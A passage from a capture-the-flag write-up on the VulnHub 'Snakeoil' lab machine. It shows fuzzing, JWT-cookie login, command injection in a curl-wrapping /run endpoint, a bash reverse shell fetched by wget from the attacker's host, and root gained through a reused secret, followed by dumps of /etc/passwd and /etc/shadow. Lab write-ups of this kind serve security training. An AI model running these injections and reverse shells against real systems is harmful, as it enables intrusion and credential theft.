<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a>    <span class="fu">{</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a>      <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="st">&quot;patrick&quot;</span><span class="fu">,</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a>      <span class="dt">&quot;password&quot;</span><span class="fu">:</span> <span class="st">&quot;`$pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CGf84r040`&quot;</span></span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a>    <span class="fu">}</span></span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true"></a>  <span class="ot">]</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true"></a><span class="fu">}</span></span></code></pre></div>
<h3 id="create-a-post">Create a post</h3>
<figure>
<img src="19.create-a-post.png" alt="" /><figcaption>19.create-a-post</figcaption>
</figure>
<p>Earlier, when I was trying post numbers manually, 5 came up with default error message for not finding. This time, at 5 there is this post.</p>
<p>This makes me believe that there are only 3 posts (1,2,4) in the beginning.</p>
<p>I created another post and it received post number 6.</p>
<h3 id="ffuf-the-site">ffuf the site</h3>
<pre class="shell"><code>ffuf -s -u http://$RHOST:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -fc 403,404,401,400 -e .cgi | grep -vi &quot;^#\|^$&quot;
1
01
2
login
04
02
4
users
registration
test
create
001
002
004
0001
run
0004
0002
000004
000002
00000001
00001
000001
00004
00000002
00002
0000001
0000002
00000004</code></pre>
<figure>
<img src="20.ffuf.png" alt="" /><figcaption>20.ffuf</figcaption>
</figure>
<h3 id="secret-has-an-internal-server-error">/secret has an internal server error</h3>
<figure>
<img src="21.internal-server-error-at-get-secret.png" alt="" /><figcaption>21.internal-server-error-at-get-secret</figcaption>
</figure>
<h4 id="copied-curl-from-firefox">copied curl from firefox</h4>
<pre class="shell"><code>curl &#39;http://192.168.56.75:8080/secret&#39; -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&#39; -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39; -H &#39;Accept-Language: en-US,en;q=0.5&#39; --compressed -H &#39;Connection: keep-alive&#39; -H &#39;Upgrade-Insecure-Requests: 1&#39; -H &#39;Cache-Control: max-age=0&#39;</code></pre>
<h4 id="copied-curl-from-chromium">copied curl from chromium</h4>
<pre class="shell"><code>curl &#39;http://192.168.56.75:8080/secret&#39; \
  -H &#39;Connection: keep-alive&#39; \
  -H &#39;Upgrade-Insecure-Requests: 1&#39; \
  -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&#39; \
  -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39; \
  -H &#39;Accept-Language: en-US,en;q=0.9&#39; \
  --compressed \
  --insecure</code></pre>
<h3 id="firing-post-secret">firing POST /secret</h3>
<figure>
<img src="22.firing-post-secret.png" alt="" /><figcaption>22.firing-post-secret</figcaption>
</figure>
<h3 id="creating-a-user-registration">creating a user /registration</h3>
<h4 id="get">GET</h4>
<pre class="shell"><code>curl &#39;http://192.168.56.75:8080/registration&#39; \
  -H &#39;Connection: keep-alive&#39; \
  -H &#39;Upgrade-Insecure-Requests: 1&#39; \
  -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&#39; \
  -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39; \
  -H &#39;Accept-Language: en-US,en;q=0.9&#39; \
  --compressed \
  --insecure</code></pre>
<h4 id="post">POST</h4>
<pre class="shell"><code>curl &#39;http://192.168.56.75:8080/registration&#39; -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&#39; -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39; -H &#39;Accept-Language: en-US,en;q=0.5&#39; --compressed -H &#39;Connection: keep-alive&#39; -H &#39;Upgrade-Insecure-Requests: 1&#39; -H &#39;Pragma: no-cache&#39; -H &#39;Cache-Control: no-cache&#39; --data-raw &#39;username=f0c1s&amp;password=Admin@1234&#39;</code></pre>
<p>Credentials: <code>f0c1s:Admin@1234</code></p>
<div class="sourceCode" id="cb13"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a><span class="fu">{</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true"></a>  <span class="dt">&quot;message&quot;</span><span class="fu">:</span> <span class="st">&quot;User f0c1s was created. Please use the login API to log in!&quot;</span><span class="fu">,</span></span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true"></a>  <span class="dt">&quot;access_token&quot;</span><span class="fu">:</span> <span class="st">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0MDAxMzk4NCwianRpIjoiYjM2NDdjMWYtNmZlZi00ZTYxLWIzODktOTY4YTllMzI5MDEyIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImYwYzFzIiwibmJmIjoxNjQwMDEzOTg0LCJleHAiOjE2NDAwMTQ4ODR9.xI4CczDuSzlF322X_nRjTUVK1xyq4FBzFq5NU7pRAJk&quot;</span></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true"></a><span class="fu">}</span></span></code></pre></div>
<figure>
<img src="23.user-f0c1s-created.png" alt="" /><figcaption>23.user-f0c1s-created</figcaption>
</figure>
<h5 id="from-terminal">From terminal</h5>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 12:03:08 PM IST 2021.12.20 12:03:08
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
curl -X POST &#39;http://192.168.56.75:8080/registration&#39; \
  -H &#39;Connection: keep-alive&#39; \
  -H &#39;Upgrade-Insecure-Requests: 1&#39; \
  -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&#39; \
  -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39; \
  -H &#39;Accept-Language: en-US,en;q=0.9&#39; \    
  --compressed \
  --insecure \                                                         
&gt; --data-raw &#39;username=f0c1s&amp;password=Admin@1234&#39;
{&quot;message&quot;: &quot;User f0c1s already exists&quot;}
                                                                                 


hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 03:29:15 PM IST 2021.12.20 15:29:15
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
curl -X POST &#39;http://192.168.56.75:8080/registration&#39; \
  -H &#39;Connection: keep-alive&#39; \
  -H &#39;Upgrade-Insecure-Requests: 1&#39; \
  -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&#39; \
  -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39; \
  -H &#39;Accept-Language: en-US,en;q=0.9&#39; \
  --compressed \
  --insecure \  
--data-raw &#39;username=tedmosby&amp;password=Admin@1234&#39;
{&quot;message&quot;: &quot;User tedmosby was created. Please use the login API to log in!&quot;, &quot;access_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0MDAxNDE3MSwianRpIjoiYjNhM2ZjYjctOTk2NS00NjRhLThkN2EtNmU1MGE0NjlkMzhlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlZG1vc2J5IiwibmJmIjoxNjQwMDE0MTcxLCJleHAiOjE2NDAwMTUwNzF9.QtPa7JPq_1ZodlV7MaLj_-R8SfWDXOzmMpvOiGENLYQ&quot;}</code></pre>
<figure>
<img src="24.user-tedmosby-is-registered-too.png" alt="" /><figcaption>24.user-tedmosby-is-registered-too</figcaption>
</figure>
<p>One thing to note here is that, usually services define username/password as the fields. This was pure luck, and first guess.</p>
<p>If this wouldn’t have worked, I’d have gone with user/password, user/pass, UserName/Password, Username/Password, and UserName/PassWord.</p>
<p>But, again, those fields are generally shown on the web page.</p>
<h3 id="jwt.io">JWT.io</h3>
<figure>
<img src="25.tedmosby-jwt-decoded.png" alt="" /><figcaption>25.tedmosby-jwt-decoded</figcaption>
</figure>
<h3 id="post-login">POST /login</h3>
<figure>
<img src="26.atleast-the-error-changed-from-405-to-400.png" alt="" /><figcaption>26.atleast-the-error-changed-from-405-to-400</figcaption>
</figure>
<h4 id="request-payload">Request Payload</h4>
<pre><code>username=f0c1s&amp;password=Admin@1234</code></pre>
<h4 id="response">Response</h4>
<pre><code>{&quot;message&quot;: {&quot;username&quot;: &quot;Username field cannot be blank.&quot;}}</code></pre>
<p>So the header didn’t work. Let’s try next method.</p>
<p><a href="https://flask-jwt-extended.readthedocs.io/en/stable/options/">The hinted page</a></p>
<p>Says that we have headers, cookies, query_string and json methods of passing the token. I have tried HEADERS, lets try COOKIES.</p>
<p>And it also says that we can pass same value in multiple locations.</p>
<figure>
<img src="27.JWT-token-options.png" alt="" /><figcaption>27.JWT-token-options</figcaption>
</figure>
<h3 id="successful-login">Successful login</h3>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 04:28:51 PM IST 2021.12.20 16:28:51
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
curl -s -X POST &#39;http://192.168.56.75:8080/login&#39; \
  -H &#39;Connection: keep-alive&#39; \
  -H &#39;Upgrade-Insecure-Requests: 1&#39; \
  -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&#39; \
  -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39; \
  -H &#39;Accept-Language: en-US,en;q=0.9&#39; \
  --compressed \
  --insecure \
  --data-raw &#39;username=tedmosby&amp;password=Admin@1234&#39; \
  --cookie &#39;access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0MDAxNDE3MSwianRpIjoiYjNhM2ZjYjctOTk2NS00NjRhLThkN2EtNmU1MGE0NjlkMzhlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlZG1vc2J5IiwibmJmIjoxNjQwMDE0MTcxLCJleHAiOjE2NDAwMTUwNzF9.QtPa7JPq_1ZodlV7MaLj_-R8SfWDXOzmMpvOiGENLYQ&#39; \
  -H &#39;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0MDAxNDE3MSwianRpIjoiYjNhM2ZjYjctOTk2NS00NjRhLThkN2EtNmU1MGE0NjlkMzhlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlZG1vc2J5IiwibmJmIjoxNjQwMDE0MTcxLCJleHAiOjE2NDAwMTUwNzF9.QtPa7JPq_1ZodlV7MaLj_-R8SfWDXOzmMpvOiGENLYQ&#39; | python3 -m json.tool

{
    &quot;message&quot;: &quot;Logged in as tedmosby&quot;,
    &quot;access_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0MDAxNzc4NSwianRpIjoiZTExYmU3NWMtNTJmZS00MDhmLThhMDAtNTA5NDJkMjQyMGY3IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlZG1vc2J5IiwibmJmIjoxNjQwMDE3Nzg1LCJleHAiOjE2NDAwMTg2ODV9.NQNQZvvcf-6NZkHaAWOSxvKBrq4R0xu2Rl7dFtzFIls&quot;,
    &quot;refresh_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0MDAxNzc4NSwianRpIjoiODUzMzZhMGQtZmNjYi00NjcwLWE5YTctYjg0ZDJjNjcwNTM4IiwidHlwZSI6InJlZnJlc2giLCJzdWIiOiJ0ZWRtb3NieSIsIm5iZiI6MTY0MDAxNzc4NSwiZXhwIjoxNjQwMDIxMzg1fQ.b4X3klzjiKC7yl0H7Hy1EwC4cq32ApjjZKnRKXnlpPA&quot;
}</code></pre>
<figure>
<img src="28.successful-login.png" alt="" /><figcaption>28.successful-login</figcaption>
</figure>
<h3 id="get-secret">GET /secret</h3>
<p><code>/secret</code> doesn’t accept POST.</p>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 04:54:44 PM IST 2021.12.20 16:54:44
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
curl -s &#39;http://192.168.56.75:8080/secret&#39; --cookie &#39;access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0MDAxOTExNywianRpIjoiZTU1MWIwY2EtYjk4Ny00ZmQxLWJiYzMtMmViN2FhOWI2NzNlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlZG1vc2J5IiwibmJmIjoxNjQwMDE5MTE3LCJleHAiOjE2NDAwMjAwMTd9.4j-aYkhn7rlIBf-7wDsCn1xVRIiyDkCxunXwrvWF4TM&#39; | python3 -m json.tool
{
    &quot;ip-address&quot;: &quot;&quot;,
    &quot;secret_key&quot;: &quot;commandexecutionissecret&quot;
}</code></pre>
<h3 id="post-run">POST /run</h3>
<pre class="shell"><code>curl -s -X POST &#39;http://192.168.56.75:8080/run&#39; \
  -H &quot;Content-Type: application/json&quot; \
  --data &#39;{&quot;url&quot;:&quot;127.0.0.1:80&quot;,&quot;secret_key&quot;:&quot;commandexecutionissecret&quot;}&#39;  
{&quot;message&quot;:&quot;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   411  100   411    0     0   133k      0 --:--:-- --:--:-- --:--:--  133k\n&quot;,&quot;success&quot;:false}</code></pre>
<figure>
<img src="29.before-RCE.png" alt="" /><figcaption>29.before-RCE</figcaption>
</figure>
<h4 id="failed-tries">Failed tries</h4>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 05:19:34 PM IST 2021.12.20 17:19:34
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
curl -s -X POST &#39;http://192.168.56.75:8080/run&#39; \
  -H &quot;Content-Type: application/json&quot; \
  --data &#39;{&quot;url&quot;:&quot;127.0.0.1:80; bash -c id&quot;,&quot;secret_key&quot;:&quot;commandexecutionissecret&quot;}&#39; \
&gt; | python3 -m json.tool   
{
    &quot;message&quot;: &quot;Banned command!&quot;,
    &quot;success&quot;: false
}
                                                                                                     


hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 05:19:52 PM IST 2021.12.20 17:19:52
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
curl -s -X POST &#39;http://192.168.56.75:8080/run&#39; \
  -H &quot;Content-Type: application/json&quot; \     
  --data &#39;{&quot;url&quot;:&quot;127.0.0.1:80\&quot;&amp;&amp; id&quot;,&quot;secret_key&quot;:&quot;commandexecutionissecret&quot;}&#39; \
| python3 -m json.tool
{
    &quot;message&quot;: &quot;/bin/sh: 1: Syntax error: Unterminated quoted string\n&quot;,
    &quot;success&quot;: false
}</code></pre>
<figure>
<img src="30.failed-rce-attempts.png" alt="" /><figcaption>30.failed-rce-attempts</figcaption>
</figure>
<h2 id="file-inclusion-attack">File inclusion attack</h2>
<h3 id="still-failing">Still failing</h3>
<pre class="shell"><code>hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 06:02:41 PM IST 2021.12.20 18:02:41
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
curl -s -X POST &#39;http://192.168.56.75:8080/run&#39; \
  -H &quot;Content-Type: application/json&quot; \      
  --data &#39;{&quot;url&quot;:&quot;-q -o 192.168.56.70/help.sh; cat help.sh&quot;,&quot;secret_key&quot;:&quot;commandexecutionissecret&quot;}&#39; \
| python3 -m json.tool
{
    &quot;message&quot;: &quot;curl: no URL specified!\ncurl: try &#39;curl --help&#39; or &#39;curl --manual&#39; for more information\n&quot;,
    &quot;success&quot;: false
}
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Monday 20 December 2021 06:02:53 PM IST 2021.12.20 18:02:53
f0c1s@kali:~/vuln-hubs/digitalworld.local/snakeoil $
curl -s -X POST &#39;http://192.168.56.75:8080/run&#39; \
  -H &quot;Content-Type: application/json&quot; \       
  --data &#39;{&quot;url&quot;:&quot;-q 192.168.56.70/help.sh -o help.sh; cat help.sh&quot;,&quot;secret_key&quot;:&quot;commandexecutionissecret&quot;}&#39; \
| python3 -m json.tool
{
    &quot;message&quot;: &quot;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100    56  100    56    0     0  28000      0 --:--:-- --:--:-- --:--:-- 28000\n&quot;,
    &quot;success&quot;: false
}</code></pre>
<p>But at least we are sure that curl is running.</p>
<p>Also, the web server is getting hit.</p>
<pre class="shell"><code>python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.75 - - [20/Dec/2021 17:53:05] &quot;GET /help.sh HTTP/1.1&quot; 200 -
192.168.56.75 - - [20/Dec/2021 17:53:11] &quot;GET /help.sh HTTP/1.1&quot; 200 -
192.168.56.75 - - [20/Dec/2021 17:53:40] &quot;GET /help.sh HTTP/1.1&quot; 200 -
192.168.56.75 - - [20/Dec/2021 17:53:47] &quot;GET /help.sh HTTP/1.1&quot; 200 -
192.168.56.75 - - [20/Dec/2021 17:54:05] &quot;GET /help.sh HTTP/1.1&quot; 200 -
192.168.56.75 - - [20/Dec/2021 17:54:14] &quot;GET /help.sh HTTP/1.1&quot; 200 -
192.168.56.75 - - [20/Dec/2021 17:54:30] &quot;GET /help.sh HTTP/1.1&quot; 200 -
192.168.56.75 - - [20/Dec/2021 18:02:17] &quot;GET /help.sh HTTP/1.1&quot; 200 -
192.168.56.75 - - [20/Dec/2021 18:02:28] &quot;GET /help.sh HTTP/1.1&quot; 200 -
192.168.56.75 - - [20/Dec/2021 18:02:41] &quot;GET /help.sh HTTP/1.1&quot; 200 -
192.168.56.75 - - [20/Dec/2021 18:03:06] &quot;GET /help.sh HTTP/1.1&quot; 200 -
</code></pre>
<pre class="shell"><code>cat help.sh                                                                         
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/192.168.56.70/443 0&gt;&amp;1
</code></pre>
<h2 id="reverse-shell">Reverse shell</h2>
<p><code>-h</code> to escape from curl, as after printing help, you can pipe other commands.</p>
<h3 id="cat-help.sh">1 cat help.sh</h3>
<pre class="shell"><code>cat help.sh 
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/192.168.56.70/443 0&gt;&amp;1</code></pre>
<h3 id="http-server">2 http server</h3>
<pre class="shell"><code>python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.75 - - [20/Dec/2021 18:22:09] &quot;GET /help.sh HTTP/1.1&quot; 200 -</code></pre>
<h3 id="listen-for-reverse-shell">3 listen for reverse shell</h3>
<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST
[sudo] password for f0c1s: 
Listening on 192.168.56.70 443</code></pre>
<h3 id="fire-reverse-shell">4 fire reverse shell</h3>
<pre class="shell"><code>curl -s -X POST &#39;http://192.168.56.75:8080/run&#39; \
  -H &quot;Content-Type: application/json&quot; \
  --data &#39;{&quot;url&quot;:&quot;-h|wget 192.168.56.70/help.sh -O help; chmod +x ./help; ./help&quot;,&quot;secret_key&quot;:&quot;commandexecutionissecret&quot;}&#39; \
| python3 -m json.tool
{
    &quot;message&quot;: &quot;The timeout is expired!&quot;,
    &quot;success&quot;: false
}</code></pre>
<h3 id="caught-shell">5 caught shell</h3>
<pre class="shell"><code>Connection received on 192.168.56.75 56012
bash: cannot set terminal process group (466): Inappropriate ioctl for device
bash: no job control in this shell
patrick@SNAKEOIL:~/flask_blog$ whoami
whoami
patrick
patrick@SNAKEOIL:~/flask_blog$ id
id
uid=1000(patrick) gid=33(www-data) groups=33(www-data),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
patrick@SNAKEOIL:~/flask_blog$ hostname
hostname
SNAKEOIL
patrick@SNAKEOIL:~/flask_blog$ date
date
Tue Dec 21 02:22:21 +08 2021
patrick@SNAKEOIL:~/flask_blog$ </code></pre>
<figure>
<img src="31.all-five-actions.png" alt="" /><figcaption>31.all-five-actions</figcaption>
</figure>
<h2 id="flag-homepatricklocal.txt">flag /home/patrick/local.txt</h2>
<pre class="shell"><code>patrick@SNAKEOIL:~$ cd
cd
patrick@SNAKEOIL:~$ pwd
pwd
/home/patrick
patrick@SNAKEOIL:~$ ls -la
ls -la
total 112
drwxr-xr-x 20 patrick patrick 4096 Aug 18 08:25 .
drwxr-xr-x  3 root    root    4096 Jun 12  2021 ..
-rw-------  1 patrick patrick 4797 Dec 21 02:21 .bash_history
-rw-r--r--  1 patrick patrick  220 Jun 12  2021 .bash_logout
-rw-r--r--  1 patrick patrick 3560 Jun 12  2021 .bashrc
drwx------ 13 patrick patrick 4096 Jun 19  2021 .cache
drwx------ 13 patrick patrick 4096 Jun 24 11:31 .config
drwxr-xr-x  2 patrick patrick 4096 Jun 12  2021 Desktop
drwxr-xr-x  2 patrick patrick 4096 Jun 12  2021 Documents
drwxr-xr-x  2 patrick patrick 4096 Jun 23 12:52 Downloads
drwxr-xr-x  7 patrick patrick 4096 Dec 21 02:22 flask_blog
drwx------  3 patrick patrick 4096 Jun 12  2021 .gnupg
-rw-------  1 patrick patrick 2278 Aug 18 08:25 .ICEauthority
drwx------  6 patrick patrick 4096 Jun 23 12:27 .local
-rw-r--r--  1 patrick patrick   29 Aug 16 20:48 local.txt
drwx------  5 patrick patrick 4096 Jun 12  2021 .mozilla
drwxr-xr-x  2 patrick patrick 4096 Jun 12  2021 Music
drwxr-xr-x  2 patrick patrick 4096 Jun 12  2021 Pictures
drwx------  3 patrick patrick 4096 Jun 23 12:52 .pki
drwxr-xr-x  4 patrick patrick 4096 Jun 23 12:52 Postman
-rw-r--r--  1 patrick patrick  807 Jun 12  2021 .profile
drwxr-xr-x  2 patrick patrick 4096 Jun 12  2021 Public
-rw-------  1 patrick patrick   80 Jun 23 11:56 .python_history
drwx------  2 patrick patrick 4096 Jun 12  2021 .ssh
drwxr-xr-x  2 patrick patrick 4096 Jun 12  2021 Templates
drwxr-xr-x  2 patrick patrick 4096 Jun 12  2021 Videos
drwxr-xr-x  8 patrick patrick 4096 Oct 14  2020 vmware-tools-distrib
patrick@SNAKEOIL:~$ 

patrick@SNAKEOIL:~$ cat local.txt
cat local.txt
Local shell access obtained!
patrick@SNAKEOIL:~$ </code></pre>
<figure>
<img src="32.user-flag.png" alt="" /><figcaption>32.user-flag</figcaption>
</figure>
<h2 id="find-password">Find password</h2>
<pre class="shell"><code>patrick@SNAKEOIL:~/flask_blog$ grep -Hnri password ./
...
./app.py:43:app.config[&#39;JWT_SECRET_KEY&#39;] = &#39;NOreasonableDOUBTthisPASSWORDisGOOD&#39;</code></pre>
<p><a href="1.out-grep-for-password.txt">Checkout ./1.out-grep-for-password.txt</a></p>
<figure>
<img src="33.patrick-password.png" alt="" /><figcaption>33.patrick-password</figcaption>
</figure>
<h2 id="root-shell">Root shell</h2>
<pre class="shell"><code>patrick@SNAKEOIL:~/flask_blog$ sudo su
sudo su
sudo: no tty present and no askpass program specified
patrick@SNAKEOIL:~/flask_blog$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
patrick@SNAKEOIL:~/flask_blog$ sudo su
sudo su
[sudo] password for patrick: NOreasonableDOUBTthisPASSWORDisGOOD

root@SNAKEOIL:/home/patrick/flask_blog# whoami
whoami
root
root@SNAKEOIL:/home/patrick/flask_blog# id
id
uid=0(root) gid=0(root) groups=0(root)
root@SNAKEOIL:/home/patrick/flask_blog# cd /root
cd /root
root@SNAKEOIL:~# ls -la
ls -la
total 40
drwx------  5 root root 4096 Dec 21 02:38 .
drwxr-xr-x 19 root root 4096 Jun 12  2021 ..
-rw-------  1 root root   50 Dec 21 02:37 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 Jun 19  2021 .cache
drwx------  3 root root 4096 Dec 21 02:38 .gnupg
drwxr-xr-x  3 root root 4096 Jun 19  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   63 Aug 16 20:47 proof.txt
-r--r-----  1 root root  669 Aug 16 20:44 sudoers.bak</code></pre>
<h2 id="flag-rootproof.txt">flag /root/proof.txt</h2>
<pre class="shell"><code>root@SNAKEOIL:~# cat proof.txt  
cat proof.txt
Congratulations on obtaining a root shell on this machine! :-)</code></pre>
<figure>
<img src="34.root-shell-and-root-flag.png" alt="" /><figcaption>34.root-shell-and-root-flag</figcaption>
</figure>
<h2 id="post-root">Post root</h2>
<h3 id="etcpasswd">/etc/passwd</h3>
<pre class="shell"><code>root@SNAKEOIL:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pulse:x:110:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:112:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</code></pre>
<h3 id="etcshadow">/etc/shadow</h3>
<pre class="shell"><code>root@SNAKEOIL:~# cat /etc/shadow
cat /etc/shadow
root:!:18789:0:99999:7:::
daemon:*:18789:0:99999:7:::
bin:*:18789:0:99999:7:::
sys:*:18789:0:99999:7:::
sync:*:18789:0:99999:7:::
games:*:18789:0:99999:7:::
man:*:18789:0:99999:7:::
lp:*:18789:0:99999:7:::
mail:*:18789:0:99999:7:::
news:*:18789:0:99999:7:::
